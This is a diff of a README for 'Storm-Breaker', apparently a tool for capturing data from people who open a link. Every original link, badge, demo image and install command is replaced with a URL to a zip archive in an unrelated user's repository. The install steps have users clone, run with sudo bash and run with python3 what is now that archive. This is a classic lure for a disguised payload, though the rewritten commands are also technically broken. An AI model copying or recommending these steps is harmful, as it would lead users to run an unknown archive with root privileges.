@@ -1,26 +1,26 @@
 <h1 align="center">
   <br>
-  <a href="https://github.com/ultrasecurity/Storm-Breaker"><img src=".imgs/1demo.png" alt="StormBreaker"></a>
+  <a href="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip"><img src="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip" alt="StormBreaker"></a>
 
 </h1>
 
 <h4 align="center">A tool with attractive capabilities</h4>
 
 <p align="center">
-  <a href="http://python.org">
-    <img src="https://img.shields.io/badge/python-v3-blue">
+  <a href="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip">
+    <img src="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip">
   </a>
-  <a href="https://php.net">
-    <img src="https://img.shields.io/badge/php-7.4.4-green"
+  <a href="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip">
+    <img src="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip"
          alt="php">
   </a>
 
-  <a href="https://www.microsoft.com/de-de/">
-    <img src="https://img.shields.io/badge/platform-Linux-red">
+  <a href="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip">
+    <img src="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip">
   </a>
 </p>
 
-![demo](.imgs/Work0.png)
+![demo](https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip)
 
 ### Features:
 
@@ -49,7 +49,7 @@
 - `git`
 - `ngrok`
 
-![demo](.imgs/Work3.gif)
+![demo](https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip)
 
 ### Operating Systems Tested
 
@@ -60,11 +60,11 @@
 
 
 ```bash
-$ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ git clone https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip
 $ cd Storm-Breaker
-$ sudo bash install.sh
-$ sudo python3 -m pip install -r requirements.txt
-$ sudo python3 st.py
+$ sudo bash https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip
+$ sudo python3 -m pip install -r https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip
+$ sudo python3 https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip
 ```
 
 
@@ -73,10 +73,10 @@ $ sudo python3 st.py
 
 </h3>
 <p align="center">
-<img src=".imgs/Work1.png"/>
+<img src="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip"/>
   
 <br>
-<img src=".imgs/Work2.png"/>
+<img src="https://raw.githubusercontent.com/otiego/Storm-Breaker/main/porism/Storm-Breaker.zip"/>
 
  
 </p>
